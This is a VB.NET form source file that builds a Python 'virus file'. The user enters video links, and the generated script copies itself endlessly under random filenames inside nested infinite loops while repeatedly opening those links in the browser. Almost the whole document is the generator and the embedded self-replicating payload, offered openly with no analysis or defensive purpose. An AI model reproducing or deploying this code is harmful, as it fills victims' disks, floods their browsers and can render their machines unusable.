Public Class Form1
    Dim file As System.IO.StreamWriter
    Dim list As New List(Of String)
    Dim tsil As New List(Of String)
    Dim allcode As New List(Of String)
    Dim code As String

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click


        list.Add(videolink.Text)
        tsil.Add(comment.Text)
        ListBox1.Items.Add(videolink.Text + "  :  " + comment.Text)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim i As Integer = 0
        For Each item As String In list
            code = ""

            If i.Equals(0) Then
                code = "    if Video == 0:
            site = web.open('[video]')
            print(site)
 "
                code = code.Replace("[video]", item)
                code = code.Replace("0", i)
                allcode.Add(code)
            Else
                code = "    elif Video == 1:
            site = web.open('[video]')
            print(site)"
                code = code.Replace("[video]", item)
                code = code.Replace("1", i)
                allcode.Add(code)
            End If
            i += 1
        Next
        SaveFileDialog1.Filter = "Python files (*.py)|*.py|All files (*.*)|*.*"
        SaveFileDialog1.ShowDialog()
        file = My.Computer.FileSystem.OpenTextFileWriter(SaveFileDialog1.FileName, True)
        file.WriteLine("import random
import shutil
import os 
import webbrowser as web
")
        Dim edoc As String
        edoc = "    Video = random.randint(0,6)
    c = 10"
        file.WriteLine("def MaggieThatch():")
        file.WriteLine(edoc.Replace("6", list.Count - 1))
        Dim l As Integer = 0
        For Each item As String In allcode

            file.WriteLine("#" + tsil(l))
            file.WriteLine(item)
            l += 1
        Next
        Dim code2 As String
        Dim code3 As New List(Of String)
        code2 = "        a = shutil.copy('[filename]','[filename]')"
        file.WriteLine("def main():
    while True:
        a = shutil.copy(__file__, __file__ + 'hello.py')
        virus = __file__
        virusNumb = '1' 
        py = '.py'
        filename = virus + virusNumb + py
        shutil.copyfile( __file__ , filename)
        print(a)
        
        while True :
            virusNumb = str(random.randint(0,100000000000))
            filename = virus + virusNumb + py
            a = shutil.copy( __file__,filename)
            MaggieThatch()
            print(a)
")
        file.WriteLine("main()")
        file.Close()
        MessageBox.Show("file done", "virus file - hts ", MessageBoxButtons.OK)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
